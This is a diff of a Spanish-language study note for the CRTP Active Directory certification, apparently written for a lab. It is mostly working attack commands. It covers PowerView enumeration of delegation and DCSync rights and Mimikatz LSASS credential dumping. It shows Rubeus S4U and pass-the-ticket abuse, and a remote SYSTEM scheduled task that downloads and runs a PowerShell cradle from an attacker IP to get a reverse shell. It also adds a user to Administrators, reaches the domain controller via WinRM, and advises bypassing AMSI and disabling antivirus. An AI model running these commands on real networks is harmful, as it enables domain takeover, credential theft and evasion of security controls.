@@ -19,6 +19,10 @@ Tags: #CRTP
 - Rubeus
 - Mimikatz
 - Powershell
+  
+NOTAS:
+- Bypass AMSI
+- Deshabilitar el antivirus 'Firewall' para hacer las Revershell 
 ```
 
 ---
@@ -32,8 +36,9 @@ Tags: #CRTP
 # Quien pertenece al grupo administradores 
 
 ---  Enumeración PowerView  ---
-NOTA: Siempre hacer un Bypass AMSI 
-	  
+!!!! NOTA: Siempre hacer un Bypass AMSI  !!!! 
+
+# Importar y utilizar PowerView 
 ❯ Get-NetComputer | Select-Object name, operatingsystem, operatingsystemversion, dnshostname
 # Enumera computadoras del dominio mostrando nombre, OS, versión del OS y hostname DNS.
 
@@ -47,9 +52,14 @@ NOTA: Siempre hacer un Bypass AMSI
 ❯ Get-NetDomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection, TrustAttributes | Format-Table -AutoSize
 # Enumera las relaciones de confianza del dominio actual mostrando origen, destino, tipo, dirección y atributos del trust — útil para identificar rutas de movimiento lateral entre dominios.
 
-# Constrained y unconstrained delegation 
+# Constrained delegation 
 ❯ Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
 # Enumera computadoras con delegación Kerberos no restringida (Constrained Delegation), mostrando nombre y los SPNs a los que pueden delegar. Ejemplos: Cifs
+
+# Unconstrained 
+❯ Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description 
+# 1.- Se necesita obligar al DC a autenticarse contra el server que tiene el Unconstrained con el obketivo de capturar el ticket e impersonarlo 
+ 
 
 # DCSync users 
 ❯ Get-DomainObjectAcl -SearchBase "DC=enterprise,DC=com" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "DS-Replication-Get-Changes-All" } | Select-Object ObjectAceType, @{Name='Identidad'; Expression={Convert-SidToName $_.SecurityIdentifier}} | Format-Table -AutoSize
@@ -82,11 +92,12 @@ NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados lo
 
 ```powershell 
 # Mimikatz 
-❯ .\mimikatz.exe        # Forma separada 
-	privilege::debug 
-	sekurlsa::logonpasswords 
+❯ .\mimikatz.exe                 # Forma separada 
+	privilege::debug         
+	sekurlsa::logonpasswords     # Proceso de LSASS
 
-❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit      # El mismo comando en una sola línea 
+# El mismo comando en una sola línea 
+❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit      
 # Habilitar SeDebugPrivilege y extraer credenciales/hashes NTLM de sesiones activas en LSASS
 ```
 
@@ -95,23 +106,23 @@ NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados lo
 ```powershell
 # Constrained Delegation: Se puede generar un ticket en el otro server de cualquier usuario pero solo para servicios específicos 
 
-❯ .\Rubeus.exe s4u /user:SERVER2$ /domain:domain.com /rc4:NTLM /impersonateuser:Administrator /msdsspn:"cifs/DATABASE.domain.com" /ptt 
+❯ .\Rubeus.exe s4u /user:SERVER2$ /domain:domain.com /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:"cifs/DATABASE.domain.com" /ptt 
 # Abusa de Constrained Delegation (S4U2Self + S4U2Proxy) permitiendo crear tickets forwardeables usando el hash NTLM de SERVER2$ para impersonar al Administrator y obtener un ticket de servicio (ST) para CIFS del objetivo — permite acceso tipo DA al recurso delegado y el flag /ptt (Pass-the-Ticket) que inyecta el ticket resultante directamente en la sesión actual — no requiere exportar el .kirbi manualmente
 
-NOTA: DATABASE es el nombre de otro server
+NOTA: DATABASE es el nombre de otro server 
  
 ❯ dir \\DATABASE.domain.com\c$        
 # Verificar el ingreso al directorio DATABASE
 
 ❯ .\Rubeus.exe s4u /user:SERVER2$ /domain:domain.com /rc4:NTLM /impersonateuser:Administrator /msdsspn:"cifs/DATABASE.domain.com" /altservice:HOST /ptt
-# Mismo ataque S4U pero con /altservice:HOST que reescribe el SPN del ticket a HOST — permite ejecutar comandos remotos vía WMI/PSRemoting en lugar de solo acceso a recursos CIFS. Vía psexec o scheduled task 
+# Mismo ataque S4U pero con /altservice:HOST que reescribe el SPN del ticket a HOST — permite ejecutar comandos remotos vía WMI/PSRemoting en lugar de solo acceso a recursos CIFS. Vía psexec o poder hacer un scheduled task 
 
 
 ---  Scheduled Task  ---
 ❯ schtasks /query /S DATABASE.domain.com /FO CSV /V | ConvertFrom-Csv | Where-Object { $_.Author -notlike "*Microsoft*" } | Select-Object TaskName, Author, "Task To Run"
 # Enumerar tareas programadas en un equipo remoto quitando las de Microsoft, útil para identificar tareas personalizadas potencialmente abusables para persistencia o privesc.
 
-❯ schtasks /create /S DATABASE.domain.com /SC Weekly /RU SYSTEM /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.5.102/powershelloneline.ps1'')'"
+❯ schtasks /create /S DATABASE.domain.com /SC Weekly /RU SYSTEM /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://IP_Atacante/powershelloneline.ps1''')'"
 # Crear una tarea llamada 'STCheck' programada semanal en el equipo remoto que se ejecuta como SYSTEM, la cual descarga y ejecuta un script PS1 desde la IP del atacante (cradle). Útil para persistencia o ejecución de código remoto.
 
 # Recibir la revershell en Windows 
@@ -124,9 +135,6 @@ NOTA: DATABASE es el nombre de otro server
 NOTA: El scheduled task te permite acceder como NT Authority\System 
 ```
 
----
-## Server 1 (DATABASE) 
-
 ```powershell 
 # Despues de tener la Revershell 
 ❯ hostname 
@@ -136,6 +144,9 @@ NOTA: El scheduled task te permite acceder como NT Authority\System
 
 ❯ net localgroup Administrators student1 /domain /add      # Otra forma de hacerlo 
 ```
+
+---
+## Ingresar a Server 1 (DATABASE) desde el server inicial 
 
 ```powershell 
 # Una vez agregado al grupo Administrators se hace esto desde el server inicial para poder ingresar por WinRM al server DATABASE
@@ -179,12 +190,20 @@ NOTA: Como el server inicial tiene el usuario que ya es parte del dominio, se pu
 ```
 
 ```powershell 
-❯ .\Rubeus.exe asktgt /user:Administrator /rc4:NTLM /domain:enterprise.com /dc:WIN-DC.domain.com /ptt
+# GOLDEN TICKET 
+❯ .\Rubeus.exe asktgt /user:Administrator /rc4:NTLM /domain:enterprise.com /dc:WIN-DC.enterprise.com /ptt
 # Solicita un TGT para Administrator usando su hash NTLM e inyecta el ticket directamente en la sesión actual (/ptt), permite acceso inmediato a recursos del dominio (DC) sin necesidad de exportar el .kirbi.
-# WIN-DC es la máquina del DC
+# WIN-DC es el nombre de la máquina del DC
 
 ❯ klist
 
 ❯ dir \\WIN-DC\C$     
 # Verificar el ingreso al directorio del DC
+```
+
+```powershell 
+# Para ingresar por PSSession utilizando WSMAN 
+❯ .\Rubeus.exe asktgs /ticket:doIFx... /service:WSMAN/WIN-DC.enterprise.com /ptt
+
+❯ winrs -r:WIN-DC.domain.com cmd
 ```
